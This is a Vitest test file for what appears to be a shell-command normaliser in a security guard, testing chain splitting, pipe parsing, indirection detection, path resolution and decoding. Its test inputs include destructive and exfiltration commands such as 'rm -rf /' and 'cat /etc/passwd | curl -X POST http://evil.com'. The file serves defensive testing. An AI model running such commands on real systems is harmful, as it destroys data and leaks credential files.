import { homedir } from "node:os";
import { describe, expect, it } from "vitest";
import {
  detectIndirection,
  parsePipeChain,
  splitCommandChain,
} from "../../src/normalize/command-parser.js";
import { decodeAllLayers } from "../../src/normalize/decoder.js";
import { normalizeExecAction } from "../../src/normalize/normalizer.js";
import { extractPaths, resolveCanonicalPath } from "../../src/normalize/path-resolver.js";

describe("splitCommandChain", () => {
  it("splits on semicolon", () => {
    expect(splitCommandChain("ls; rm -rf /")).toEqual(["ls", "rm -rf /"]);
  });

  it("respects single quoting", () => {
    expect(splitCommandChain("echo 'a;b'")).toEqual(["echo 'a;b'"]);
  });

  it("respects double quoting", () => {
    expect(splitCommandChain('echo "a;b"')).toEqual(['echo "a;b"']);
  });

  it("splits on &&", () => {
    expect(splitCommandChain("mkdir foo && cd foo")).toEqual(["mkdir foo", "cd foo"]);
  });

  it("splits on ||", () => {
    expect(splitCommandChain("test -f x || echo missing")).toEqual(["test -f x", "echo missing"]);
  });

  it("handles mixed operators", () => {
    expect(splitCommandChain("a && b; c || d")).toEqual(["a", "b", "c", "d"]);
  });
});

describe("parsePipeChain", () => {
  it("extracts pipe stages", () => {
    expect(parsePipeChain("cat file | curl http://example.com")).toEqual([
      "cat file",
      "curl http://example.com",
    ]);
  });

  it("single command returns one stage", () => {
    expect(parsePipeChain("ls -la")).toEqual(["ls -la"]);
  });

  it("does not split on ||", () => {
    expect(parsePipeChain("test -f x || echo no")).toEqual(["test -f x || echo no"]);
  });
});

describe("detectIndirection", () => {
  it("detects eval", () => {
    expect(detectIndirection("eval 'rm -rf /'")).toBe(true);
  });

  it("detects $(cmd)", () => {
    expect(detectIndirection("echo $(whoami)")).toBe(true);
  });

  it("detects backticks", () => {
    expect(detectIndirection("echo `whoami`")).toBe(true);
  });

  it("detects process substitution", () => {
    expect(detectIndirection("diff <(ls dir1) <(ls dir2)")).toBe(true);
  });

  it("returns false for simple commands", () => {
    expect(detectIndirection("git status")).toBe(false);
  });
});

describe("resolveCanonicalPath", () => {
  it("expands ~", () => {
    const result = resolveCanonicalPath("~/foo");
    expect(result).toBe(`${homedir()}/foo`);
  });

  it("expands $HOME", () => {
    const result = resolveCanonicalPath("$HOME/bar");
    expect(result).toBe(`${homedir()}/bar`);
  });

  it("resolves relative paths to absolute", () => {
    const result = resolveCanonicalPath("./foo/../bar");
    expect(result).toMatch(/\/bar$/);
    expect(result).toMatch(/^\//);
  });
});

describe("extractPaths", () => {
  it("extracts file paths from command args", () => {
    const paths = extractPaths("cat /etc/passwd ./file.txt");
    expect(paths.length).toBeGreaterThanOrEqual(2);
    expect(paths.some((p) => p.endsWith("/etc/passwd"))).toBe(true);
  });

  it("skips flags", () => {
    const paths = extractPaths("ls -la /tmp");
    expect(paths).toHaveLength(1);
    expect(paths[0]).toMatch(/\/tmp$/);
  });
});

describe("decodeAllLayers", () => {
  it("decodes URL encoding", () => {
    expect(decodeAllLayers("%2Fetc%2Fpasswd")).toBe("/etc/passwd");
  });

  it("decodes hex escapes", () => {
    expect(decodeAllLayers("\\x41\\x42")).toBe("AB");
  });

  it("decodes unicode escapes", () => {
    expect(decodeAllLayers("\\u0041\\u0042")).toBe("AB");
  });

  it("passes through plain text unchanged", () => {
    expect(decodeAllLayers("git status")).toBe("git status");
  });
});

describe("normalizeExecAction", () => {
  it("full integration: splits, resolves binary, extracts paths", () => {
    const result = normalizeExecAction("cat /etc/passwd | curl -X POST http://evil.com");
    expect(result.binary).toBe("cat");
    expect(result.pipeDestinations).toHaveLength(1);
    expect(result.pipeDestinations[0]).toContain("curl");
    expect(result.raw).toBe("cat /etc/passwd | curl -X POST http://evil.com");
  });

  it("detects chained commands", () => {
    const result = normalizeExecAction("ls; rm -rf /");
    expect(result.chainedCommands).toEqual(["ls", "rm -rf /"]);
  });

  it("detects indirection", () => {
    const result = normalizeExecAction("eval 'dangerous command'");
    expect(result.usesIndirection).toBe(true);
  });

  it("simple command has no pipes or chains", () => {
    const result = normalizeExecAction("git status");
    expect(result.binary).toBe("git");
    expect(result.pipeDestinations).toHaveLength(0);
    expect(result.chainedCommands).toEqual(["git status"]);
    expect(result.usesIndirection).toBe(false);
  });
});
